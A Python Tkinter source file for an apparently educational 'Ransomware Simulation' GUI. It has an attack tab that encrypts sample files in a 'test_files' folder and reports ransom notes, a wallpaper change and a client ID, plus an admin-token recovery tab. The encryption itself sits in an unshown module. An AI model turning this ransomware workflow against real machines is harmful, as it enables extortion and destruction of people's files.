import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
from client_core import simulate_ransomware, simulate_recovery, CLIENT_ID

class RansomwareSimulatorGUI:
    def __init__(self, root):
        self.root = root
        root.title("Ransomware Simulation")
        root.geometry("600x400")
        root.resizable(False, False)
        
        self.setup_ui()
        
    def setup_ui(self):
        # Create notebook (tabs)
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Attack Tab
        attack_frame = ttk.Frame(notebook)
        notebook.add(attack_frame, text="Simulate Attack")
        
        ttk.Label(attack_frame, text="Cybersecurity Ransomware Simulation", font=("Arial", 14)).pack(pady=10)
        ttk.Label(attack_frame, text="This is for educational purposes only!\nFiles in 'test_files' will be encrypted.").pack(pady=5)
        
        ttk.Button(
            attack_frame, 
            text="Run Simulation", 
            command=self.run_attack,
            style="Danger.TButton"
        ).pack(pady=20)
        
        self.attack_status = scrolledtext.ScrolledText(attack_frame, height=8, state='disabled')
        self.attack_status.pack(fill='x', padx=10, pady=5)
        
        # Recovery Tab
        recovery_frame = ttk.Frame(notebook)
        notebook.add(recovery_frame, text="Recover Files")
        
        ttk.Label(recovery_frame, text="Admin Recovery Panel", font=("Arial", 14)).pack(pady=10)
        
        input_frame = ttk.Frame(recovery_frame)
        input_frame.pack(fill='x', padx=20, pady=10)
        
        ttk.Label(input_frame, text="Client ID:").grid(row=0, column=0, sticky='w')
        self.client_id_entry = ttk.Entry(input_frame, width=40)
        self.client_id_entry.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(input_frame, text="Admin Token:").grid(row=1, column=0, sticky='w')
        self.token_entry = ttk.Entry(input_frame, width=40, show="*")
        self.token_entry.grid(row=1, column=1, padx=5, pady=5)
        
        ttk.Button(
            recovery_frame, 
            text="Decrypt Files", 
            command=self.run_recovery
        ).pack(pady=10)
        
        self.recovery_status = scrolledtext.ScrolledText(recovery_frame, height=8, state='disabled')
        self.recovery_status.pack(fill='x', padx=10, pady=5)
        
        # Configure styles
        style = ttk.Style()
        style.configure("Danger.TButton", foreground='red', font=('Arial', 10, 'bold'))
        
    def log_attack(self, message):
        self.attack_status.config(state='normal')
        self.attack_status.insert(tk.END, message + "\n")
        self.attack_status.see(tk.END)
        self.attack_status.config(state='disabled')
        
    def log_recovery(self, message):
        self.recovery_status.config(state='normal')
        self.recovery_status.insert(tk.END, message + "\n")
        self.recovery_status.see(tk.END)
        self.recovery_status.config(state='disabled')
        
    def run_attack(self):
        self.log_attack("Starting ransomware simulation...")
        self.log_attack("Creating test_files directory if needed...")
        
        # Create test files
        import os
        if not os.path.exists("test_files"):
            os.makedirs("test_files")
            for i in range(3):
                with open(f"test_files/sample_{i}.txt", "w") as f:
                    f.write(f"This is a test file #{i}\n")
        
        threading.Thread(target=self._execute_attack, daemon=True).start()
        
    def _execute_attack(self):
        if simulate_ransomware():
            self.log_attack("Simulation completed successfully!")
            self.log_attack(f"Your Client ID: {CLIENT_ID}")
            self.log_attack("Check your desktop wallpaper and ransom notes!")
        else:
            self.log_attack("Simulation failed. Check server connection.")
            
    def run_recovery(self):
        client_id = self.client_id_entry.get()
        token = self.token_entry.get()
        
        if not client_id or not token:
            messagebox.showerror("Error", "Both fields are required")
            return
            
        self.log_recovery(f"Starting recovery for client: {client_id}")
        threading.Thread(
            target=self._execute_recovery, 
            args=(client_id, token),
            daemon=True
        ).start()
        
   # client/client_gui.py (modify _execute_recovery)
    def _execute_recovery(self, client_id, token):
    # Capture output from simulate_recovery
        import sys
        from io import StringIO
        
        old_stdout = sys.stdout
        sys.stdout = buffer = StringIO()
        
        success = simulate_recovery(client_id, token)
        
        output = buffer.getvalue()
        sys.stdout = old_stdout
        
        # Log the output
        self.log_recovery(output)
        
        if success:
            self.log_recovery("Recovery completed successfully!")
        else:
            self.log_recovery("Recovery failed. See error messages above.")

if __name__ == '__main__':
    root = tk.Tk()
    app = RansomwareSimulatorGUI(root)
    root.mainloop()